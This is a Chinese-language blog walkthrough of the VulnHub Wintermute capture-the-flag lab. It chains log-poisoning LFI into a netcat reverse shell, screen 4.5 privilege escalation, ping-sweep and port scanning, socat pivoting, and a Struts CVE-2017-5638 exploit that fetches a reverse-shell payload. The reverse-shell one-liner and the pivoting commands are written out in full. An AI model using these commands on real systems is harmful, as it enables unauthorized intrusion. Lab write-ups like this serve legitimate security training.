---
layout: post
title: LFI-GetShell->端口转发->Getshell
---

> Wild animals never kill for sport. Man is the only one to whom the torture and death of his fellow creatures is amusing in itself.——James Anthony Froude

先附上wintermute[下载地址](https://download.vulnhub.com/wintermute/Wintermute-v1.zip)  

简单介绍下wintermute ：**A new OSCP style lab involving 2 vulnerable machines**，有两个靶机, 第一个靶机是入口，有两个网卡，起到pivoiting的作用，第二个靶机有一个网卡，需要先入侵进第一个后通过第一个靶机才能和第二个靶机进行交流。


**_Victim1: 192.168.56.102_**
![图片](/pics/1586401635855.jpg)

80端口没有可利用，3000端口是ntopng流量监控平台通过默认用户名和密码登陆后可以看到一个奇怪的目录。
![](/pics/1586402049129.jpg)

进入后发现此页面
![](/pics/1586402845054.jpg)

可以推断?bolo这个参数后面的值是日志文件，而且根据提示此日志文件的后缀名是.log，但是url中并不需要输入.log后缀，可以通过html页面中进一步确定，说明bolo.php会自动在值的后面加入log后缀，进一步fuzz得出用%00这种空字节无法绕过，所以../../../../etc/passwd%00的方法无效。
![](/pics/1586403125152.jpg)

nmap端口显示端口25 Postfix smtpd开放，经过查询得知postfix默认log文件位于/var/log/mail.log中，所以是不是可以用污染邮件日志的方法来达到命令注入呢。

![](/pics/1586403587352.jpg)
![](/pics/1586403887017.jpg)
![](/pics/1586403890295.jpg)

通过tcpdump监听确定可以RCE后，直接用```mkfifo /tmp/p; /bin/sh 0</tmp/p | nc 192.168.56.1 1234 1>/tmp/p```来得到reverse shell, 虽然麻烦了点，但是一劳永逸，防止nc版本不对没有-e的选项。

1. 进入shell后通过查看suid文件 find / -user root -perm 4000 2>/dev/null得到存在screen 4.5
2. searchsploit screen 4.5
3. 通过exploit得到root后
4. 因为没有nmap，所以要自己编写ping sweep来查看第二个网卡存在的victim2
5. ping sweep必须要使用&进行background操作，不然速度太慢，具体的脚本如下  
for i in $(seq 1 255); do (ping -c 1 192.168.57.$i | grep "bytes from" &);done
6. 得到ip后继续写脚本查看开放的端口
nc -z -w 1 -n -v $ip 1-65535 
7. 得到三个端口开放后用可以编写脚本来查看banner情况
echo "QUIT" | grep nc $ip $port $port $port
8. 然后利用socat进行端口转发
socat tcp-listen:$port,fork tcp:$victim1:$port & 
socat tcp-listen:$port,fork tcp:$victim1:$port &
socat tcp-listen:$port,fork tcp:$victim1:$port &
9. 因为rce利用的是java.lang.Runtime@getRuntime所以管道符号不能使用,要用wget来进行下载，不能用nc
10. attaker上启动nc -lvp 1234准备监听
11. attacker上同时启动服务器，准备好msfvenom写好的reverse shell（这个reverse shell的LHOST是victim1)
11. victim1上转发代理，socat tcp-listen:1234,fork tcp:$attack:1234 &
12. 然后用attacker执行https://github.com/mazen160/struts-pwn此poc（CVE-2017-5638），注意url应该写victim1的因为已经做了转发，从victim1上下载attacker上准备好的reverse shell.
13. Over...